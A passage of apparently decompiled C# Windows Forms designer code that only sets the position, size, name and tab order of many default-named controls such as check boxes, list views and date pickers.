			this.PictureBox8.Location = new Point(267, 264);
			this.PictureBox8.Name = "PictureBox8";
			this.PictureBox8.Size = new Size(100, 50);
			this.PictureBox8.TabIndex = 100;
			this.PictureBox8.TabStop = false;
			this.CheckedListBox32.FormattingEnabled = true;
			this.CheckedListBox32.Location = new Point(289, -16);
			this.CheckedListBox32.Name = "CheckedListBox32";
			this.CheckedListBox32.Size = new Size(120, 94);
			this.CheckedListBox32.TabIndex = 364;
			this.Label16.AutoSize = true;
			this.Label16.Location = new Point(605, 174);
			this.Label16.Name = "Label16";
			this.Label16.Size = new Size(45, 13);
			this.Label16.TabIndex = 363;
			this.Label16.Text = "Label16";
			this.DateTimePicker24.Location = new Point(560, 238);
			this.DateTimePicker24.Name = "DateTimePicker24";
			this.DateTimePicker24.Size = new Size(25, 20);
			this.DateTimePicker24.TabIndex = 362;
			this.ComboBox17.FormattingEnabled = true;
			this.ComboBox17.Location = new Point(544, 127);
			this.ComboBox17.Name = "ComboBox17";
			this.ComboBox17.Size = new Size(33, 21);
			this.ComboBox17.TabIndex = 361;
			this.CheckedListBox33.FormattingEnabled = true;
			this.CheckedListBox33.Location = new Point(414, 127);
			this.CheckedListBox33.Name = "CheckedListBox33";
			this.CheckedListBox33.Size = new Size(35, 4);
			this.CheckedListBox33.TabIndex = 360;
			this.ListView24.HideSelection = false;
			this.ListView24.Location = new Point(312, 250);
			this.ListView24.Name = "ListView24";
			this.ListView24.Size = new Size(86, 16);
			this.ListView24.TabIndex = 359;
			this.ListView24.UseCompatibleStateImageBehavior = false;
			this.MaskedTextBox16.Location = new Point(344, 62);
			this.MaskedTextBox16.Name = "MaskedTextBox16";
			this.MaskedTextBox16.Size = new Size(100, 20);
			this.MaskedTextBox16.TabIndex = 358;
			this.ListView25.HideSelection = false;
			this.ListView25.Location = new Point(328, 46);
			this.ListView25.Name = "ListView25";
			this.ListView25.Size = new Size(121, 97);
			this.ListView25.TabIndex = 357;
			this.ListView25.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox34.FormattingEnabled = true;
			this.CheckedListBox34.Location = new Point(320, 38);
			this.CheckedListBox34.Name = "CheckedListBox34";
			this.CheckedListBox34.Size = new Size(120, 94);
			this.CheckedListBox34.TabIndex = 356;
			this.ComboBox18.FormattingEnabled = true;
			this.ComboBox18.Location = new Point(329, 165);
			this.ComboBox18.Name = "ComboBox18";
			this.ComboBox18.Size = new Size(121, 21);
			this.ComboBox18.TabIndex = 355;
			this.RadioButton9.AutoSize = true;
			this.RadioButton9.Location = new Point(518, 222);
			this.RadioButton9.Name = "RadioButton9";
			this.RadioButton9.Size = new Size(90, 17);
			this.RadioButton9.TabIndex = 354;
			this.RadioButton9.TabStop = true;
			this.RadioButton9.Text = "RadioButton9";
			this.RadioButton9.UseVisualStyleBackColor = true;
			this.ProgressBar9.Location = new Point(416, 286);
			this.ProgressBar9.Name = "ProgressBar9";
			this.ProgressBar9.Size = new Size(100, 23);
			this.ProgressBar9.TabIndex = 353;
			this.DateTimePicker25.Location = new Point(625, 108);
			this.DateTimePicker25.Name = "DateTimePicker25";
			this.DateTimePicker25.Size = new Size(200, 20);
			this.DateTimePicker25.TabIndex = 352;
			this.MonthCalendar9.Location = new Point(347, 48);
			this.MonthCalendar9.Name = "MonthCalendar9";
			this.MonthCalendar9.TabIndex = 351;
			this.PictureBox9.Location = new Point(544, 214);
			this.PictureBox9.Name = "PictureBox9";
			this.PictureBox9.Size = new Size(100, 50);
			this.PictureBox9.TabIndex = 350;
			this.PictureBox9.TabStop = false;
			this.CheckedListBox35.FormattingEnabled = true;
			this.CheckedListBox35.Location = new Point(-12, 44);
			this.CheckedListBox35.Name = "CheckedListBox35";
			this.CheckedListBox35.Size = new Size(120, 94);
			this.CheckedListBox35.TabIndex = 349;
			this.CheckedListBox36.FormattingEnabled = true;
			this.CheckedListBox36.Location = new Point(389, 168);
			this.CheckedListBox36.Name = "CheckedListBox36";
			this.CheckedListBox36.Size = new Size(8, 4);
			this.CheckedListBox36.TabIndex = 348;
			this.Label17.AutoSize = true;
			this.Label17.Location = new Point(304, 234);
			this.Label17.Name = "Label17";
			this.Label17.Size = new Size(45, 13);
			this.Label17.TabIndex = 347;
			this.Label17.Text = "Label17";
			this.DateTimePicker26.Location = new Point(259, 298);
			this.DateTimePicker26.Name = "DateTimePicker26";
			this.DateTimePicker26.Size = new Size(25, 20);
			this.DateTimePicker26.TabIndex = 346;
			this.ComboBox19.FormattingEnabled = true;
			this.ComboBox19.Location = new Point(243, 187);
			this.ComboBox19.Name = "ComboBox19";
			this.ComboBox19.Size = new Size(33, 21);
			this.ComboBox19.TabIndex = 345;
			this.CheckedListBox37.FormattingEnabled = true;
			this.CheckedListBox37.Location = new Point(113, 187);
			this.CheckedListBox37.Name = "CheckedListBox37";
			this.CheckedListBox37.Size = new Size(35, 4);
			this.CheckedListBox37.TabIndex = 344;
			this.MaskedTextBox17.Location = new Point(342, 310);
			this.MaskedTextBox17.Name = "MaskedTextBox17";
			this.MaskedTextBox17.Size = new Size(47, 20);
			this.MaskedTextBox17.TabIndex = 343;
			this.ListView26.HideSelection = false;
			this.ListView26.Location = new Point(11, 310);
			this.ListView26.Name = "ListView26";
			this.ListView26.Size = new Size(86, 16);
			this.ListView26.TabIndex = 342;
			this.ListView26.UseCompatibleStateImageBehavior = false;
			this.CheckBox22.AutoSize = true;
			this.CheckBox22.Location = new Point(550, 270);
			this.CheckBox22.Name = "CheckBox22";
			this.CheckBox22.Size = new Size(87, 17);
			this.CheckBox22.TabIndex = 341;
			this.CheckBox22.Text = "CheckBox22";
			this.CheckBox22.UseVisualStyleBackColor = true;
			this.MaskedTextBox18.Location = new Point(43, 122);
			this.MaskedTextBox18.Name = "MaskedTextBox18";
			this.MaskedTextBox18.Size = new Size(100, 20);
			this.MaskedTextBox18.TabIndex = 340;
			this.CheckBox23.AutoSize = true;
			this.CheckBox23.Location = new Point(-78, 56);
			this.CheckBox23.Name = "CheckBox23";
			this.CheckBox23.Size = new Size(87, 17);
			this.CheckBox23.TabIndex = 339;
			this.CheckBox23.Text = "CheckBox23";
			this.CheckBox23.UseVisualStyleBackColor = true;
			this.ListView27.HideSelection = false;
			this.ListView27.Location = new Point(163, 78);
			this.ListView27.Name = "ListView27";
			this.ListView27.Size = new Size(121, 97);
			this.ListView27.TabIndex = 338;
			this.ListView27.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox38.FormattingEnabled = true;
			this.CheckedListBox38.Location = new Point(19, 98);
			this.CheckedListBox38.Name = "CheckedListBox38";
			this.CheckedListBox38.Size = new Size(120, 94);
			this.CheckedListBox38.TabIndex = 337;
			this.ComboBox20.FormattingEnabled = true;
			this.ComboBox20.Location = new Point(-133, 309);
			this.ComboBox20.Name = "ComboBox20";
			this.ComboBox20.Size = new Size(121, 21);
			this.ComboBox20.TabIndex = 336;
			this.RadioButton10.AutoSize = true;
			this.RadioButton10.Location = new Point(217, 282);
			this.RadioButton10.Name = "RadioButton10";
			this.RadioButton10.Size = new Size(96, 17);
			this.RadioButton10.TabIndex = 335;
			this.RadioButton10.TabStop = true;
			this.RadioButton10.Text = "RadioButton10";
			this.RadioButton10.UseVisualStyleBackColor = true;
			this.ProgressBar10.Location = new Point(115, 346);
			this.ProgressBar10.Name = "ProgressBar10";
			this.ProgressBar10.Size = new Size(100, 23);
			this.ProgressBar10.TabIndex = 334;
			this.Button8.Location = new Point(498, 224);
			this.Button8.Name = "Button8";
			this.Button8.Size = new Size(75, 23);
			this.Button8.TabIndex = 333;
			this.Button8.Text = "Button8";
			this.Button8.UseVisualStyleBackColor = true;
			this.CheckBox24.AutoSize = true;
			this.CheckBox24.Location = new Point(362, 249);
			this.CheckBox24.Name = "CheckBox24";
			this.CheckBox24.Size = new Size(87, 17);
			this.CheckBox24.TabIndex = 332;
			this.CheckBox24.Text = "CheckBox24";
			this.CheckBox24.UseVisualStyleBackColor = true;
			this.DateTimePicker27.Location = new Point(324, 168);
			this.DateTimePicker27.Name = "DateTimePicker27";
			this.DateTimePicker27.Size = new Size(200, 20);
			this.DateTimePicker27.TabIndex = 331;
			this.DateTimePicker28.Location = new Point(389, 278);
			this.DateTimePicker28.Name = "DateTimePicker28";
			this.DateTimePicker28.Size = new Size(200, 20);
			this.DateTimePicker28.TabIndex = 330;
			this.MonthCalendar10.Location = new Point(334, 21);
			this.MonthCalendar10.Name = "MonthCalendar10";
			this.MonthCalendar10.TabIndex = 329;
			this.Label18.AutoSize = true;
			this.Label18.Location = new Point(482, 249);
			this.Label18.Name = "Label18";
			this.Label18.Size = new Size(45, 13);
			this.Label18.TabIndex = 328;
			this.Label18.Text = "Label18";
			this.ListView28.HideSelection = false;
			this.ListView28.Location = new Point(529, 124);
			this.ListView28.Name = "ListView28";
			this.ListView28.Size = new Size(8, 8);
			this.ListView28.TabIndex = 327;
			this.ListView28.UseCompatibleStateImageBehavior = false;
			this.PictureBox10.Location = new Point(217, 243);
			this.PictureBox10.Name = "PictureBox10";
			this.PictureBox10.Size = new Size(100, 50);
			this.PictureBox10.TabIndex = 326;
			this.PictureBox10.TabStop = false;
			this.CheckedListBox39.FormattingEnabled = true;
			this.CheckedListBox39.Location = new Point(-20, 36);
			this.CheckedListBox39.Name = "CheckedListBox39";
			this.CheckedListBox39.Size = new Size(120, 94);
			this.CheckedListBox39.TabIndex = 325;
			this.CheckedListBox40.FormattingEnabled = true;
			this.CheckedListBox40.Location = new Point(381, 160);
			this.CheckedListBox40.Name = "CheckedListBox40";
			this.CheckedListBox40.Size = new Size(8, 4);
			this.CheckedListBox40.TabIndex = 324;
			this.Label19.AutoSize = true;
			this.Label19.Location = new Point(296, 226);
			this.Label19.Name = "Label19";
			this.Label19.Size = new Size(45, 13);
			this.Label19.TabIndex = 323;
			this.Label19.Text = "Label19";
			this.DateTimePicker29.Location = new Point(251, 290);
			this.DateTimePicker29.Name = "DateTimePicker29";
			this.DateTimePicker29.Size = new Size(25, 20);
			this.DateTimePicker29.TabIndex = 322;
			this.ComboBox21.FormattingEnabled = true;
			this.ComboBox21.Location = new Point(235, 179);
			this.ComboBox21.Name = "ComboBox21";
			this.ComboBox21.Size = new Size(33, 21);
			this.ComboBox21.TabIndex = 321;
			this.CheckedListBox41.FormattingEnabled = true;
			this.CheckedListBox41.Location = new Point(105, 179);
			this.CheckedListBox41.Name = "CheckedListBox41";
			this.CheckedListBox41.Size = new Size(35, 4);
			this.CheckedListBox41.TabIndex = 320;
			this.MaskedTextBox19.Location = new Point(334, 302);
			this.MaskedTextBox19.Name = "MaskedTextBox19";
			this.MaskedTextBox19.Size = new Size(47, 20);
			this.MaskedTextBox19.TabIndex = 319;
			this.ListView29.HideSelection = false;
			this.ListView29.Location = new Point(3, 302);
			this.ListView29.Name = "ListView29";
			this.ListView29.Size = new Size(86, 16);
			this.ListView29.TabIndex = 318;
			this.ListView29.UseCompatibleStateImageBehavior = false;
			this.CheckBox25.AutoSize = true;
			this.CheckBox25.Location = new Point(542, 262);
			this.CheckBox25.Name = "CheckBox25";
			this.CheckBox25.Size = new Size(87, 17);
			this.CheckBox25.TabIndex = 317;
			this.CheckBox25.Text = "CheckBox25";
			this.CheckBox25.UseVisualStyleBackColor = true;
			this.MaskedTextBox20.Location = new Point(35, 114);
			this.MaskedTextBox20.Name = "MaskedTextBox20";
			this.MaskedTextBox20.Size = new Size(100, 20);
			this.MaskedTextBox20.TabIndex = 316;
			this.CheckBox26.AutoSize = true;
			this.CheckBox26.Location = new Point(-86, 48);
			this.CheckBox26.Name = "CheckBox26";
			this.CheckBox26.Size = new Size(87, 17);
			this.CheckBox26.TabIndex = 315;
			this.CheckBox26.Text = "CheckBox26";
			this.CheckBox26.UseVisualStyleBackColor = true;
			this.ListView30.HideSelection = false;
			this.ListView30.Location = new Point(19, 98);
			this.ListView30.Name = "ListView30";
			this.ListView30.Size = new Size(121, 97);
			this.ListView30.TabIndex = 314;
			this.ListView30.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox42.FormattingEnabled = true;
			this.CheckedListBox42.Location = new Point(11, 90);
			this.CheckedListBox42.Name = "CheckedListBox42";
			this.CheckedListBox42.Size = new Size(120, 94);
			this.CheckedListBox42.TabIndex = 313;
			this.ComboBox22.FormattingEnabled = true;
			this.ComboBox22.Location = new Point(20, 217);
			this.ComboBox22.Name = "ComboBox22";
			this.ComboBox22.Size = new Size(121, 21);
			this.ComboBox22.TabIndex = 312;
			this.RadioButton11.AutoSize = true;
			this.RadioButton11.Location = new Point(209, 274);
			this.RadioButton11.Name = "RadioButton11";
			this.RadioButton11.Size = new Size(96, 17);
			this.RadioButton11.TabIndex = 311;
			this.RadioButton11.TabStop = true;
			this.RadioButton11.Text = "RadioButton11";
			this.RadioButton11.UseVisualStyleBackColor = true;
			this.ProgressBar11.Location = new Point(161, 253);
			this.ProgressBar11.Name = "ProgressBar11";
			this.ProgressBar11.Size = new Size(100, 23);
			this.ProgressBar11.TabIndex = 310;
			this.Button9.Location = new Point(490, 216);
			this.Button9.Name = "Button9";
			this.Button9.Size = new Size(75, 23);
			this.Button9.TabIndex = 309;
			this.Button9.Text = "Button9";
			this.Button9.UseVisualStyleBackColor = true;
			this.CheckBox27.AutoSize = true;
			this.CheckBox27.Location = new Point(354, 241);
			this.CheckBox27.Name = "CheckBox27";
			this.CheckBox27.Size = new Size(87, 17);
			this.CheckBox27.TabIndex = 308;
			this.CheckBox27.Text = "CheckBox27";
			this.CheckBox27.UseVisualStyleBackColor = true;
			this.DateTimePicker30.Location = new Point(316, 160);
			this.DateTimePicker30.Name = "DateTimePicker30";
			this.DateTimePicker30.Size = new Size(200, 20);
			this.DateTimePicker30.TabIndex = 307;
			this.DateTimePicker31.Location = new Point(292, 222);
			this.DateTimePicker31.Name = "DateTimePicker31";
			this.DateTimePicker31.Size = new Size(200, 20);
			this.DateTimePicker31.TabIndex = 306;
			this.MonthCalendar11.Location = new Point(-44, 71);
			this.MonthCalendar11.Name = "MonthCalendar11";
			this.MonthCalendar11.TabIndex = 305;
			this.Label20.AutoSize = true;
			this.Label20.Location = new Point(474, 241);
			this.Label20.Name = "Label20";
			this.Label20.Size = new Size(45, 13);
			this.Label20.TabIndex = 304;
			this.Label20.Text = "Label20";
			this.ListView31.HideSelection = false;
			this.ListView31.Location = new Point(521, 116);
			this.ListView31.Name = "ListView31";
			this.ListView31.Size = new Size(8, 8);
			this.ListView31.TabIndex = 303;
			this.ListView31.UseCompatibleStateImageBehavior = false;
			this.PictureBox11.Location = new Point(235, 266);
			this.PictureBox11.Name = "PictureBox11";
			this.PictureBox11.Size = new Size(100, 50);
			this.PictureBox11.TabIndex = 302;
			this.PictureBox11.TabStop = false;
			this.CheckedListBox43.FormattingEnabled = true;
			this.CheckedListBox43.Location = new Point(-27, 11);
			this.CheckedListBox43.Name = "CheckedListBox43";
			this.CheckedListBox43.Size = new Size(120, 94);
			this.CheckedListBox43.TabIndex = 301;
			this.CheckedListBox44.FormattingEnabled = true;
			this.CheckedListBox44.Location = new Point(374, 135);
			this.CheckedListBox44.Name = "CheckedListBox44";
			this.CheckedListBox44.Size = new Size(8, 4);
			this.CheckedListBox44.TabIndex = 300;
			this.Label21.AutoSize = true;
			this.Label21.Location = new Point(289, 201);
			this.Label21.Name = "Label21";
			this.Label21.Size = new Size(45, 13);
			this.Label21.TabIndex = 299;
			this.Label21.Text = "Label21";
			this.DateTimePicker32.Location = new Point(244, 265);
			this.DateTimePicker32.Name = "DateTimePicker32";
			this.DateTimePicker32.Size = new Size(25, 20);
			this.DateTimePicker32.TabIndex = 298;
			this.ComboBox23.FormattingEnabled = true;
			this.ComboBox23.Location = new Point(228, 154);
			this.ComboBox23.Name = "ComboBox23";
			this.ComboBox23.Size = new Size(33, 21);
			this.ComboBox23.TabIndex = 297;
			this.CheckedListBox45.FormattingEnabled = true;
			this.CheckedListBox45.Location = new Point(98, 154);
			this.CheckedListBox45.Name = "CheckedListBox45";
			this.CheckedListBox45.Size = new Size(35, 4);
			this.CheckedListBox45.TabIndex = 296;
			this.MaskedTextBox21.Location = new Point(327, 277);
			this.MaskedTextBox21.Name = "MaskedTextBox21";
			this.MaskedTextBox21.Size = new Size(47, 20);
			this.MaskedTextBox21.TabIndex = 295;
			this.ListView32.HideSelection = false;
			this.ListView32.Location = new Point(-4, 277);
			this.ListView32.Name = "ListView32";
			this.ListView32.Size = new Size(86, 16);
			this.ListView32.TabIndex = 294;
			this.ListView32.UseCompatibleStateImageBehavior = false;
			this.CheckBox28.AutoSize = true;
			this.CheckBox28.Location = new Point(535, 237);
			this.CheckBox28.Name = "CheckBox28";
			this.CheckBox28.Size = new Size(87, 17);
			this.CheckBox28.TabIndex = 293;
			this.CheckBox28.Text = "CheckBox28";
			this.CheckBox28.UseVisualStyleBackColor = true;
			this.MaskedTextBox22.Location = new Point(28, 89);
			this.MaskedTextBox22.Name = "MaskedTextBox22";
			this.MaskedTextBox22.Size = new Size(100, 20);
			this.MaskedTextBox22.TabIndex = 292;
			this.CheckBox29.AutoSize = true;
			this.CheckBox29.Location = new Point(-93, 23);
			this.CheckBox29.Name = "CheckBox29";
			this.CheckBox29.Size = new Size(87, 17);
			this.CheckBox29.TabIndex = 291;
			this.CheckBox29.Text = "CheckBox29";
			this.CheckBox29.UseVisualStyleBackColor = true;
			this.ListView33.HideSelection = false;
			this.ListView33.Location = new Point(12, 73);
			this.ListView33.Name = "ListView33";
			this.ListView33.Size = new Size(121, 97);
			this.ListView33.TabIndex = 290;
			this.ListView33.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox46.FormattingEnabled = true;
			this.CheckedListBox46.Location = new Point(4, 65);
			this.CheckedListBox46.Name = "CheckedListBox46";
			this.CheckedListBox46.Size = new Size(120, 94);
			this.CheckedListBox46.TabIndex = 289;
			this.ComboBox24.FormattingEnabled = true;
			this.ComboBox24.Location = new Point(13, 192);
			this.ComboBox24.Name = "ComboBox24";
			this.ComboBox24.Size = new Size(121, 21);
			this.ComboBox24.TabIndex = 288;
			this.RadioButton12.AutoSize = true;
			this.RadioButton12.Location = new Point(202, 249);
			this.RadioButton12.Name = "RadioButton12";
			this.RadioButton12.Size = new Size(96, 17);
			this.RadioButton12.TabIndex = 287;
			this.RadioButton12.TabStop = true;
			this.RadioButton12.Text = "RadioButton12";
			this.RadioButton12.UseVisualStyleBackColor = true;
			this.ProgressBar12.Location = new Point(122, 234);
			this.ProgressBar12.Name = "ProgressBar12";
			this.ProgressBar12.Size = new Size(100, 23);
			this.ProgressBar12.TabIndex = 286;
			this.Button10.Location = new Point(483, 191);
			this.Button10.Name = "Button10";
			this.Button10.Size = new Size(75, 23);
			this.Button10.TabIndex = 285;
			this.Button10.Text = "Button10";
			this.Button10.UseVisualStyleBackColor = true;
			this.CheckBox30.AutoSize = true;
			this.CheckBox30.Location = new Point(347, 216);
			this.CheckBox30.Name = "CheckBox30";
			this.CheckBox30.Size = new Size(87, 17);
			this.CheckBox30.TabIndex = 284;
			this.CheckBox30.Text = "CheckBox30";
			this.CheckBox30.UseVisualStyleBackColor = true;
			this.DateTimePicker33.Location = new Point(309, 135);
			this.DateTimePicker33.Name = "DateTimePicker33";
			this.DateTimePicker33.Size = new Size(200, 20);
			this.DateTimePicker33.TabIndex = 283;
			this.DateTimePicker34.Location = new Point(374, 245);
			this.DateTimePicker34.Name = "DateTimePicker34";
			this.DateTimePicker34.Size = new Size(200, 20);
			this.DateTimePicker34.TabIndex = 282;
			this.MonthCalendar12.Location = new Point(-44, 168);
			this.MonthCalendar12.Name = "MonthCalendar12";
			this.MonthCalendar12.TabIndex = 281;
			this.Label22.AutoSize = true;
			this.Label22.Location = new Point(467, 216);
			this.Label22.Name = "Label22";
			this.Label22.Size = new Size(45, 13);
			this.Label22.TabIndex = 280;
			this.Label22.Text = "Label22";
			this.ListView34.HideSelection = false;
			this.ListView34.Location = new Point(514, 91);
			this.ListView34.Name = "ListView34";
			this.ListView34.Size = new Size(8, 8);
			this.ListView34.TabIndex = 279;
			this.ListView34.UseCompatibleStateImageBehavior = false;
			this.PictureBox12.Location = new Point(228, 241);
			this.PictureBox12.Name = "PictureBox12";
			this.PictureBox12.Size = new Size(100, 50);
			this.PictureBox12.TabIndex = 278;
			this.PictureBox12.TabStop = false;
			this.CheckedListBox47.FormattingEnabled = true;
			this.CheckedListBox47.Location = new Point(367, -38);
			this.CheckedListBox47.Name = "CheckedListBox47";
			this.CheckedListBox47.Size = new Size(120, 94);
			this.CheckedListBox47.TabIndex = 277;
			this.Label23.AutoSize = true;
			this.Label23.Location = new Point(683, 152);
			this.Label23.Name = "Label23";
			this.Label23.Size = new Size(45, 13);
			this.Label23.TabIndex = 276;
			this.Label23.Text = "Label23";
			this.DateTimePicker35.Location = new Point(638, 216);
			this.DateTimePicker35.Name = "DateTimePicker35";
			this.DateTimePicker35.Size = new Size(25, 20);
			this.DateTimePicker35.TabIndex = 275;
			this.ComboBox25.FormattingEnabled = true;
			this.ComboBox25.Location = new Point(622, 105);
			this.ComboBox25.Name = "ComboBox25";
			this.ComboBox25.Size = new Size(33, 21);
			this.ComboBox25.TabIndex = 274;
			this.CheckedListBox48.FormattingEnabled = true;
			this.CheckedListBox48.Location = new Point(492, 105);
			this.CheckedListBox48.Name = "CheckedListBox48";
			this.CheckedListBox48.Size = new Size(35, 4);
			this.CheckedListBox48.TabIndex = 273;
			this.ListView35.HideSelection = false;
			this.ListView35.Location = new Point(390, 228);
			this.ListView35.Name = "ListView35";
			this.ListView35.Size = new Size(86, 16);
			this.ListView35.TabIndex = 272;
			this.ListView35.UseCompatibleStateImageBehavior = false;
			this.MaskedTextBox23.Location = new Point(422, 40);
			this.MaskedTextBox23.Name = "MaskedTextBox23";
			this.MaskedTextBox23.Size = new Size(100, 20);
			this.MaskedTextBox23.TabIndex = 271;
			this.CheckBox31.AutoSize = true;
			this.CheckBox31.Location = new Point(301, -26);
			this.CheckBox31.Name = "CheckBox31";
			this.CheckBox31.Size = new Size(87, 17);
			this.CheckBox31.TabIndex = 270;
			this.CheckBox31.Text = "CheckBox31";
			this.CheckBox31.UseVisualStyleBackColor = true;
			this.ListView36.HideSelection = false;
			this.ListView36.Location = new Point(406, 24);
			this.ListView36.Name = "ListView36";
			this.ListView36.Size = new Size(121, 97);
			this.ListView36.TabIndex = 269;
			this.ListView36.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox49.FormattingEnabled = true;
			this.CheckedListBox49.Location = new Point(398, 16);
			this.CheckedListBox49.Name = "CheckedListBox49";
			this.CheckedListBox49.Size = new Size(120, 94);
			this.CheckedListBox49.TabIndex = 268;
			this.ComboBox26.FormattingEnabled = true;
			this.ComboBox26.Location = new Point(407, 143);
			this.ComboBox26.Name = "ComboBox26";
			this.ComboBox26.Size = new Size(121, 21);
			this.ComboBox26.TabIndex = 267;
			this.RadioButton13.AutoSize = true;
			this.RadioButton13.Location = new Point(596, 200);
			this.RadioButton13.Name = "RadioButton13";
			this.RadioButton13.Size = new Size(96, 17);
			this.RadioButton13.TabIndex = 266;
			this.RadioButton13.TabStop = true;
			this.RadioButton13.Text = "RadioButton13";
			this.RadioButton13.UseVisualStyleBackColor = true;
			this.ProgressBar13.Location = new Point(494, 264);
			this.ProgressBar13.Name = "ProgressBar13";
			this.ProgressBar13.Size = new Size(100, 23);
			this.ProgressBar13.TabIndex = 265;
			this.DateTimePicker36.Location = new Point(703, 86);
			this.DateTimePicker36.Name = "DateTimePicker36";
			this.DateTimePicker36.Size = new Size(200, 20);
			this.DateTimePicker36.TabIndex = 264;
			this.MonthCalendar13.Location = new Point(425, 26);
			this.MonthCalendar13.Name = "MonthCalendar13";
			this.MonthCalendar13.TabIndex = 263;
			this.PictureBox13.Location = new Point(622, 192);
			this.PictureBox13.Name = "PictureBox13";
			this.PictureBox13.Size = new Size(100, 50);
			this.PictureBox13.TabIndex = 262;
			this.PictureBox13.TabStop = false;
			this.CheckedListBox50.FormattingEnabled = true;
			this.CheckedListBox50.Location = new Point(66, 22);
			this.CheckedListBox50.Name = "CheckedListBox50";
			this.CheckedListBox50.Size = new Size(120, 94);
			this.CheckedListBox50.TabIndex = 261;
			this.CheckedListBox51.FormattingEnabled = true;
			this.CheckedListBox51.Location = new Point(467, 146);
			this.CheckedListBox51.Name = "CheckedListBox51";
			this.CheckedListBox51.Size = new Size(8, 4);
			this.CheckedListBox51.TabIndex = 260;
			this.Label24.AutoSize = true;
			this.Label24.Location = new Point(382, 212);
			this.Label24.Name = "Label24";
			this.Label24.Size = new Size(45, 13);
			this.Label24.TabIndex = 259;
			this.Label24.Text = "Label24";
			this.DateTimePicker37.Location = new Point(337, 276);
			this.DateTimePicker37.Name = "DateTimePicker37";
			this.DateTimePicker37.Size = new Size(25, 20);
			this.DateTimePicker37.TabIndex = 258;
			this.ComboBox27.FormattingEnabled = true;
			this.ComboBox27.Location = new Point(321, 165);
			this.ComboBox27.Name = "ComboBox27";
			this.ComboBox27.Size = new Size(33, 21);
			this.ComboBox27.TabIndex = 257;
			this.CheckedListBox52.FormattingEnabled = true;
			this.CheckedListBox52.Location = new Point(191, 165);
			this.CheckedListBox52.Name = "CheckedListBox52";
			this.CheckedListBox52.Size = new Size(35, 4);
			this.CheckedListBox52.TabIndex = 256;
			this.MaskedTextBox24.Location = new Point(420, 288);
			this.MaskedTextBox24.Name = "MaskedTextBox24";
			this.MaskedTextBox24.Size = new Size(47, 20);
			this.MaskedTextBox24.TabIndex = 255;
			this.ListView37.HideSelection = false;
			this.ListView37.Location = new Point(89, 288);
			this.ListView37.Name = "ListView37";
			this.ListView37.Size = new Size(86, 16);
			this.ListView37.TabIndex = 254;
			this.ListView37.UseCompatibleStateImageBehavior = false;
			this.CheckBox32.AutoSize = true;
			this.CheckBox32.Location = new Point(628, 248);
			this.CheckBox32.Name = "CheckBox32";
			this.CheckBox32.Size = new Size(87, 17);
			this.CheckBox32.TabIndex = 253;
			this.CheckBox32.Text = "CheckBox32";
			this.CheckBox32.UseVisualStyleBackColor = true;
			this.MaskedTextBox25.Location = new Point(121, 100);
			this.MaskedTextBox25.Name = "MaskedTextBox25";
			this.MaskedTextBox25.Size = new Size(100, 20);
			this.MaskedTextBox25.TabIndex = 252;
			this.CheckBox33.AutoSize = true;
			this.CheckBox33.Location = new Point(0, 34);
			this.CheckBox33.Name = "CheckBox33";
			this.CheckBox33.Size = new Size(87, 17);
			this.CheckBox33.TabIndex = 251;
			this.CheckBox33.Text = "CheckBox33";
			this.CheckBox33.UseVisualStyleBackColor = true;
			this.ListView38.HideSelection = false;
			this.ListView38.Location = new Point(241, 56);
			this.ListView38.Name = "ListView38";
			this.ListView38.Size = new Size(121, 97);
			this.ListView38.TabIndex = 250;
			this.ListView38.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox53.FormattingEnabled = true;
			this.CheckedListBox53.Location = new Point(97, 76);
			this.CheckedListBox53.Name = "CheckedListBox53";
			this.CheckedListBox53.Size = new Size(120, 94);
			this.CheckedListBox53.TabIndex = 249;
			this.ComboBox28.FormattingEnabled = true;
			this.ComboBox28.Location = new Point(-55, 287);
			this.ComboBox28.Name = "ComboBox28";
			this.ComboBox28.Size = new Size(121, 21);
			this.ComboBox28.TabIndex = 248;
			this.RadioButton14.AutoSize = true;
			this.RadioButton14.Location = new Point(295, 260);
			this.RadioButton14.Name = "RadioButton14";
			this.RadioButton14.Size = new Size(96, 17);
			this.RadioButton14.TabIndex = 247;
			this.RadioButton14.TabStop = true;
			this.RadioButton14.Text = "RadioButton14";
			this.RadioButton14.UseVisualStyleBackColor = true;
			this.ProgressBar14.Location = new Point(193, 324);
			this.ProgressBar14.Name = "ProgressBar14";
			this.ProgressBar14.Size = new Size(100, 23);
			this.ProgressBar14.TabIndex = 246;
			this.Button11.Location = new Point(576, 202);
			this.Button11.Name = "Button11";
			this.Button11.Size = new Size(75, 23);
			this.Button11.TabIndex = 245;
			this.Button11.Text = "Button11";
			this.Button11.UseVisualStyleBackColor = true;
			this.CheckBox34.AutoSize = true;
			this.CheckBox34.Location = new Point(440, 227);
			this.CheckBox34.Name = "CheckBox34";
			this.CheckBox34.Size = new Size(87, 17);
			this.CheckBox34.TabIndex = 244;
			this.CheckBox34.Text = "CheckBox34";
			this.CheckBox34.UseVisualStyleBackColor = true;
			this.DateTimePicker38.Location = new Point(402, 146);
			this.DateTimePicker38.Name = "DateTimePicker38";
			this.DateTimePicker38.Size = new Size(200, 20);
			this.DateTimePicker38.TabIndex = 243;
			this.DateTimePicker39.Location = new Point(467, 256);
			this.DateTimePicker39.Name = "DateTimePicker39";
			this.DateTimePicker39.Size = new Size(200, 20);
			this.DateTimePicker39.TabIndex = 242;
			this.MonthCalendar14.Location = new Point(412, -1);
			this.MonthCalendar14.Name = "MonthCalendar14";
			this.MonthCalendar14.TabIndex = 241;
			this.Label25.AutoSize = true;
			this.Label25.Location = new Point(560, 227);
			this.Label25.Name = "Label25";
			this.Label25.Size = new Size(45, 13);
			this.Label25.TabIndex = 240;
			this.Label25.Text = "Label25";
			this.ListView39.HideSelection = false;
			this.ListView39.Location = new Point(607, 102);
			this.ListView39.Name = "ListView39";
			this.ListView39.Size = new Size(8, 8);
			this.ListView39.TabIndex = 239;
			this.ListView39.UseCompatibleStateImageBehavior = false;
			this.PictureBox14.Location = new Point(295, 221);
			this.PictureBox14.Name = "PictureBox14";
			this.PictureBox14.Size = new Size(100, 50);
			this.PictureBox14.TabIndex = 238;
			this.PictureBox14.TabStop = false;
			this.CheckedListBox54.FormattingEnabled = true;
			this.CheckedListBox54.Location = new Point(58, 14);
			this.CheckedListBox54.Name = "CheckedListBox54";
			this.CheckedListBox54.Size = new Size(120, 94);
			this.CheckedListBox54.TabIndex = 237;
			this.CheckedListBox55.FormattingEnabled = true;
